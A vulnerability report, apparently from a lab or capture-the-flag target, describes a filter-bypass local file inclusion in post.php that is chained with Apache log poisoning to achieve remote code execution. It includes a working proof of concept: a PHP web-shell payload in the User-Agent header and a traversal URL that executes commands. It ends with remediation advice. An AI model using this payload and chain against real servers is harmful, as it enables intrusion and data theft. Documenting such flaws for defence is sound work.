# Remote Code Execution via Local File Inclusion in post.php

**ID:** vuln-0001
**Severity:** CRITICAL
**Found:** 2025-12-06 07:51:38 UTC

## Description

## Vulnerability Description
A Critical Local File Inclusion (LFI) vulnerability exists in the `/post.php` endpoint via the `id` parameter. The application attempts to sanitize user input to prevent directory traversal, but the sanitization logic is flawed and can be bypassed using the pattern `....//`. When processed, this pattern resolves to `../`, allowing an attacker to traverse the directory structure.

Combined with a Log Poisoning technique, this LFI vulnerability allows for Remote Code Execution (RCE). An attacker can inject malicious PHP code into the `User-Agent` HTTP header, which is logged by the Apache web server to `/var/log/apache2/access.log`. By then including this log file via the LFI vulnerability, the injected PHP code is executed by the server.

## Proof of Concept (PoC)

### Step 1: User-Agent Poisoning
Send a request to the server with a malicious `User-Agent` header containing PHP code. This injects the payload into the server's access log.

**Request:**
```http
GET / HTTP/1.1
Host: host.docker.internal:10079
User-Agent: <?php system($_GET['cmd']); ?>
```

### Step 2: Execute Code via LFI
Trigger the LFI vulnerability to include the poisoned log file. The `....//` pattern bypasses the filter to traverse to the log directory.

**URL:**
`http://host.docker.internal:10079/post.php?id=....//....//....//var/log/apache2/access.log&cmd=id`

**Result:**
The server response will contain the output of the `id` command (e.g., `uid=33(www-data) gid=33(www-data) groups=33(www-data)`), confirming RCE.

## Impact
This vulnerability allows an unauthenticated attacker to execute arbitrary code on the server with the privileges of the web server user (e.g., `www-data`). This leads to:
- Full system compromise.
- Exfiltration of sensitive data (e.g., configuration files, source code, flags).
- Modification or deletion of data.
- Potential lateral movement within the internal network.

## Remediation
1.  **Input Validation:** Implement strict allowlisting for the `id` parameter. Only allow known, safe filenames (e.g., `ScriptKiddie.php`, `EternalBlue.php`) to be processed.
    ```php
    $allowed_files = ['ScriptKiddie.php', 'EternalBlue.php', ...];
    if (!in_array($_GET['id'], $allowed_files)) {
        // Deny access
    }
    ```
2.  **Sanitization:** Use built-in functions like `basename()` to strip directory path components if filenames are dynamic, ensuring only the filename part is used.
3.  **Disable Path Traversal:** Configure `open_basedir` in `php.ini` to restrict file access to specific web directories.
4.  **Log Permissions:** Ensure web server logs are not readable by the web server user itself if possible, though this may impact some logging functionality.
